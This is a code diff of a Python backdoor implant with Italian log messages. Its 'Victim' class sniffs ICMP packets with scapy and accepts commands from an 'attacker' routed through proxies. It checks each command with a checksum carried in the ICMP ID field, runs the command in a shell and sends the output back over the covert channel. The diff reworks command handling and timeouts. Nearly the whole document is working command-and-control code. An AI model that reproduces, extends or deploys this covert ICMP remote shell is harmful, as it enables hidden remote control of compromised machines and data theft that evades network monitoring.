@@ -26,7 +26,7 @@ sys.path.insert(0, directory)
 import type_singleton as singleton
 
 
-
+WAITING_TIME=10
 #---------------------- 
 
 
@@ -128,19 +128,23 @@ def execute_command(command):
         except Exception as e:
             raise Exception(f"execute_command: {e}") 
 
-def callback_wait_for_command(connected_proxy:list, event_pktconn:threading.Event, comando:str): 
+def callback_wait_for_command(connected_proxy:list, event_pktconn:threading.Event, comando:list): 
     def callback(packet):
+        nonlocal comando, connected_proxy, event_pktconn
         print(f"callback wait_for_command received:\n\t{packet.summary()}") 
         if packet.haslayer(IP) and packet.haslayer(ICMP) and packet.haslayer(Raw): 
-            if packet[IP].src in connected_proxy and com.CONFIRM_COMMAND.encode() in packet[Raw].load:
-                comando=packet[Raw].load.decode().replace(com.CONFIRM_COMMAND,"")
-                checksum=com.CONFIRM_COMMAND+comando
-                checksum=mymethods.calc_checksum(checksum.encode())
+            if ipaddress.ip_address(packet[IP].src) in connected_proxy and com.CONFIRM_COMMAND.encode() in packet[Raw].load:
+                comando.append(packet[Raw].load.decode().replace(com.CONFIRM_COMMAND,""))
+                checksum=mymethods.calc_checksum((com.CONFIRM_COMMAND+comando[0]).encode())
                 print(f"Payload: {packet[Raw].load} and ICMP ID: {packet[ICMP].id}") 
                 if packet[ICMP].id==checksum: 
+                    print(f"Ricevuto il comando {comando}")
                     com.set_threading_Event(event_pktconn)
                     return 
-            print(f"Received packet from not recognized address {packet[IP].src} and payload is {packet[Raw].load}")
+            if ipaddress.ip_address(packet[IP].src) not in connected_proxy:
+                print(f"Received packet from not recognized address {packet[IP].src}")
+            if com.CONFIRM_COMMAND.encode() not in packet[Raw].load:
+                print(f"Payload doesn't have com.CONFIRM_COMMAND {packet[Raw].load}")
     return callback
     
 
@@ -167,7 +171,7 @@ def done_waiting_timeout(sniffer, enough_proxy_timer:threading.Timer, event_enou
         if ask_to_continue(msg):
             print("Continuo ad aspettare...")
             enough_proxy_timer = threading.Timer(
-                60
+                WAITING_TIME
                 ,lambda: done_waiting_timeout(sniffer, enough_proxy_timer, event_enough_proxy, callback_reached_proxy_number))
             enough_proxy_timer.start()
             return
@@ -206,7 +210,7 @@ def is_proxy_already_connected(proxy:ipaddress.IPv4Address|ipaddress.IPv6Address
     lock_connected_proxy.acquire()
     is_already_connected= proxy in connected_proxy
     lock_connected_proxy.release() 
-    return is_already_connected
+    return is_already_connected 
 
 def callback_wait_conn_from_proxy(connected_proxy:list, ip_host:ipaddress.IPv4Address|ipaddress.IPv6Address, event_enough_proxy:threading.Event, lock_connected_proxy:threading.Lock, num_proxy:int): 
     def callback(packet):
@@ -220,8 +224,7 @@ def callback_wait_conn_from_proxy(connected_proxy:list, ip_host:ipaddress.IPv4Ad
             confirm_text=(com.CONFIRM_PROXY+ip_host.compressed).encode()
             checksum=mymethods.calc_checksum(confirm_text) 
             if confirm_text in packet[Raw].load and checksum==packet[ICMP].id: 
-                print(f"il pacchetto ha confermato la connessione...") 
-                
+                #confirm_conn_to_proxy
                 data=(com.CONFIRM_VICTIM+ip_host.compressed+ip_src.compressed).encode()
                 if com.send_packet(data,ip_src): 
                     add_proxy_to_connected_list(
@@ -231,8 +234,10 @@ def callback_wait_conn_from_proxy(connected_proxy:list, ip_host:ipaddress.IPv4Ad
                         ,lock_connected_proxy
                         ,num_proxy
                     ) 
+                    print(f"Il pacchetto ha confermato la connessione per {ip_src}") 
                     return
-        print(f"il pacchetto non ha confermato la connessione...")
+                print(f"{ip_src} non ha risposto al messaggio di conferma. ") 
+        print(f"Il pacchetto non ha confermato la connessione...")
     return callback
      
 
@@ -324,15 +329,15 @@ class Victim:
         
         try:
             #wait_command_send_data
-            command=self.wait_attacker_command() 
+            self.wait_attacker_command() 
             process_shell=None
-            while command is not None and command not in com.exit_cases:
+            while self.command and self.command not in com.exit_cases:
                 try: 
-                    process_shell=execute_command(command)
+                    process_shell=execute_command(self.command)
                     com.is_valid_shell(process_shell) 
                     data=get_data_from_command(process_shell) 
                     self.send_data_to_proxies(data) 
-                    command=self.wait_attacker_command()
+                    self.wait_attacker_command()
                 except Exception as e:
                     print(f"wait_command_send_data: {e}")
             try:
@@ -372,14 +377,7 @@ class Victim:
             #,"store":True 
             ,"iface":interface
         }  
-        try: 
-            #sniffer, enough_proxy_timer:threading.Timer, event_enough_proxy:threading.Event 
-            #def callback_function_timer():
-            #    return done_waiting_timeout(
-            #        self.sniffer
-            #        ,self.enough_proxy_timer
-            #        ,self.event_enough_proxy
-            #    ) 
+        try:  
             callback_function_timer = lambda: done_waiting_timeout(
                 self.sniffer
                 ,self.enough_proxy_timer
@@ -391,17 +389,17 @@ class Victim:
                 )
             )
             self.sniffer,self.enough_proxy_timer=com.sniff_packet_w_callbak(
-                 args,60,callback_function_timer
+                 args,WAITING_TIME,callback_function_timer
             )
             com.wait_threading_Event(self.event_enough_proxy)  
         except Exception as e:
             raise Exception(f"wait_conn_from_proxy: {e}") 
         stop_sinffer(self.sniffer)
         stop_timer(self.enough_proxy_timer) 
-        print(f"I proxy utilzzabili sono: {len(self.connected_proxy)}\n\t{self.connected_proxy}") 
+        print(f"I proxy utilzzabili sono {len(self.connected_proxy)}: {self.connected_proxy}") 
             
     def wait_attacker_command(self): 
-        self.command=None
+        self.command=[]
         print("Waiting for a command...") 
         filter=singleton.AttackType().get_filter_connection_from_function(
             "wait_attacker_command"
@@ -428,12 +426,20 @@ class Victim:
                 ,event=self.event_pktconn
             ) 
             com.wait_threading_Event(self.event_pktconn) 
+            if len(self.command)==1:
+                self.command=self.command[0]
+            elif len(self.command)>1:
+                print(f"Errore multipli comandi: {self.command}")
+                self.command=self.command[0]
+            elif len(self.command)<1: 
+                print(f"Errore nessun comando: {self.command}")
+                self.command=com.END_COMMUNICATION
+                
         except Exception as e:
             raise Exception(f"wait_attacker_command: {e}") 
         print(f"Comando ricevuto: {self.command}") 
         stop_sinffer(self.sniffer)
-        stop_timer(self.timeout_timer) 
-        return self.command 
+        stop_timer(self.timeout_timer)  
 
     def send_data_to_proxies(self,data_to_send:list=None):
         try: 
